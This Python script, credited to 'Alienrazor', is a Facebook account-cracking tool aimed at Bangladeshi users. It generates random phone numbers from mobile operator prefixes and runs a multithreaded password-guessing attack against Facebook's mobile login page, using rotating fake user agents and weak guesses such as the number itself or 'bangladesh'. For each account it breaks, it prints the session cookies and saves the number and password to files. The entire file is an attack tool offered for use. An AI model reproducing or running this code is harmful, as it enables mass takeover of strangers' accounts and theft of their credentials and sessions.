#Tools By Alienrazor

#___________Impoet Module____________
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
#________________Step 2______________
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#_______________Coler Code_____________
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#____________Timedate_____________
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#_____________Proxy______________
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""

\033[0;91m                 ..              .:.
              ~YJ^.              .~J5!.
            ^G@J                   .J@B!
         ?~ B@Y                      5@&:7?
        ^@5:#@J                      Y@@!P@^
        ~@@#&@&7        ....:~      ?@@@#@@^
       7:J@@@@@7     :75####B7      ?@@@@@J^7
       !#55#@@@~:    :!~P@@@!      :~@@@#55#!
        ~P&@@@@5J?^.    !@@@Y   .^JJ5@@@@&P^
         .7YPB&@BB##BPYY#@@@@YPB##GB@&BPY7.
          ?B##&@@@@@@@@@@@@@@@@@@@@@@@##G7
           :?G&@&G#@@@@@@@@@@@@@&#B&@#P7.
              :~?7~~?#@&@@@@&@B?^!?7^.
                 !!YP5~~&@@&~~PPJ!!
                .^7J^  5@@@@Y .^J7^
                      J@&&&&@?
                     !#&G##B&#!
                     G5&5##P&PG
                     Y7&Y##5#7Y
                     ..GJ##5P..
                       J?#&Y?
                       ~7#&J^
                       .~#&!.
                        .#&:
                        .B&:
                         G#.
                         GB
                         5P
                         7J
                         .         \033[0;92m  
                         
                               """)

def ALIZ():
	print('_____________________________\n')
#_____________Def Main______________ 

def menu():

    os.system('clear')

    print(logo)

    print 
    
    print ("\033[0;93mAUTHOR   : Alienrazor")

    print ("\033[0;94mBD CLONE : FACEBOOK ")

    print ("\033[0;96mGITHUB   : Alienrazor")

    print ('')

    print ("\033[0;90mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE")
 
    print ("\033[0;91m")

    print('')

    print ("\033[0;92m[1]  \x1b[1;92mGP")

    print ("\033[0;92m[2]  \x1b[1;92mRobi")

    print ("\033[0;92m[3]  \x1b[1;92mAirtel")

    print ("\033[0;92m[4]  \x1b[1;92mBanglalink")

    print ("\033[0;92m[5]  \x1b[1;92mTeletalk")

    print ("\033[0;92m[0]  \x1b[1;90mExit            ")

    bch = input("\033[0;92m\n> ")
    if bch in ["1"," 01"]:
      gp()
    elif bch in ["2"," 02"]:
        robi()
    elif bch in ["3"," 03"]:
        air()
    elif bch in ["4"," 04"]:
        bangla()
    elif bch in ["5"," 05"]:
        tele()
    elif bch in ["0"]:
        exit()


#______________Def Sc__________  

def gp():
    user=[]
    os.system('clear')
    print(logo)
    print('')
    print ("170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,\n131, 132, 133, 134, 135, 136, 137, 138, 139")
    print('')
    code = input('[?] Choice Your Code : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('')
    print('[×] Exm: 2000 3000 5000 10000 ')
    print('')
    limit = int(input('[?] Choice Your Liimit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[×] Total ids: '+tl)
        print("[×] Your Code: "+code)
        print('[×] Airplne Moode On/Off')
        print('[×] Process has been started')
        print('_____________________________\n')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(alienrazor,uid,pwx,tl)
    print('_____________________________\n')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as ALIENRAZOR-OK.txt')
    print(' [✓] CP Id Save as ALIENRAZOR-CP.txt')
    print('_____________________________\n')    




#_____________________________---DEF ROBI_____________________________----

          
def robi():
    user=[]
    os.system('clear')
    print(logo)
    print('')
    print ("180,181, 182, 183, 184, 185, 186, 187, 188, 189")
    print('')
    code = input('[?] Choice Your Code : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('')
    print('[×] Exm: 2000 3000 5000 10000 ')
    print('')
    limit = int(input('[?] Choice Your Liimit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[×] Total ids: '+tl)
        print("[×] Your Code: "+code)
        print('[×] Airplne Moode On/Off')
        print('[×] Process has been started')
        print('_____________________________\n')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(alienrazor,uid,pwx,tl)
    print('_____________________________\n')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as ALIENRAZOR-OK.txt')
    print(' [✓] CP Id Save as ALIENRAZOR-CP.txt')
    print('_____________________________\n')
    
    
    
#_____________________________---DEF AIRTEL_____________________________----
    

    
def air():
    user=[]
    os.system('clear')
    print(logo)
    print('')
    print ("160,161, 162, 163, 164, 165, 166, 167, 168, 169")
    print('')
    code = input('[?] Choice Your Code : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('')
    print('[×] Exm: 2000 3000 5000 10000 ')
    print('')
    limit = int(input('[?] Choice Your Liimit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[×] Total ids: '+tl)
        print("[×] Your Code: "+code)
        print('[×] Airplne Moode On/Off')
        print('[×] Process has been started')
        print('_____________________________\n')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(alienrazor,uid,pwx,tl)
    print('_____________________________\n')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as ALIENRAZOR-OK.txt')
    print(' [✓] CP Id Save as ALIENRAZOR-CP.txt')
    print('_____________________________\n') 
    
 
    
#_____________________________---DEF BANGLALINK_____________________________----
          
    
def bangla():
    user=[]
    os.system('clear')
    print(logo)
    print('')
    print ("190,191, 192, 193, 194, 195, 196, 197, 198, \n199,140,141, 142, 143, 144, 145, 146, 147, 148, 149")
    print('')
    code = input('[?] Choice Your Code : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('')
    print('[×] Exm: 2000 3000 5000 10000 ')
    print('')
    limit = int(input('[?] Choice Your Liimit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[×] Total ids: '+tl)
        print("[×] Your Code: "+code)
        print('[×] Airplne Moode On/Off')
        print('[×] Process has been started')
        print('_____________________________\n')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(alienrazor,uid,pwx,tl)
    print('_____________________________\n')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as ALIENRAZOR-OK.txt')
    print(' [✓] CP Id Save as ALIENRAZOR-CP.txt')
    print('_____________________________\n')   
    
    
    
    
#_____________________________---DEF TELETALK_____________________________----
    
    
    
    
def tele():
    user=[]
    os.system('clear')
    print(logo)
    print('')
    print ("150,151, 152, 153, 154, 155, 156, 157, 158, 159")
    print('')
    code = input('[?] Choice Your Code : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('')
    print('[×] Exm: 2000 3000 5000 10000 ')
    print('')
    limit = int(input('[?] Choice Your Liimit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[×] Total ids: '+tl)
        print("[×] Your Code: "+code)
        print('[×] Airplne Moode On/Off')
        print('[×] Process has been started')
        print('_____________________________\n')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(alienrazor,uid,pwx,tl)
    print('_____________________________\n')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as ALIENRAZOR-OK.txt')
    print(' [✓] CP Id Save as ALIENRAZOR-CP.txt')
    print('_____________________________\n')    
    
    
    
#_____________________________---DEF CRACK_____________________________----    
    
    
    
def alienrazor(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[ALIENRAZOR]-[%s/%s]-[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'm.facebook.com',
    'method': 'GET',
    'path': '/',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',    
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',
}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"[ALIENRAZOR-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/ALIENRAZOR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[ALIENRAZOR-CP] {cid}|{ps}")
                open('/sdcard/ALIENRAZOR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
menu()
